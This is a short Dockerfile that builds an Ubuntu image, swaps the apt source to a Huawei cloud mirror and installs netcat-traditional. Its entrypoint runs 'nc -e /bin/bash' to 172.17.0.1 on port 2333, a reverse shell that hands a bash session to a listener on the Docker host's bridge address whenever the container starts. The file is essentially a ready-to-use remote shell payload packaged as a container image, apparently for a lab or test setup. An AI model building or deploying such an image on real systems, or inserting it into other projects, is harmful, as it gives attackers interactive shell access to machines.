FROM ubuntu

RUN sed -i "s@http://.*ubuntu.com@http://repo.huaweicloud.com@g" /etc/apt/sources.list
RUN apt-get update && apt-get install -y --no-install-recommends netcat-traditional && rm -rf /var/lib/apt/lists/*;

ENTRYPOINT ["nc", "-e", "/bin/bash", "172.17.0.1", "2333"]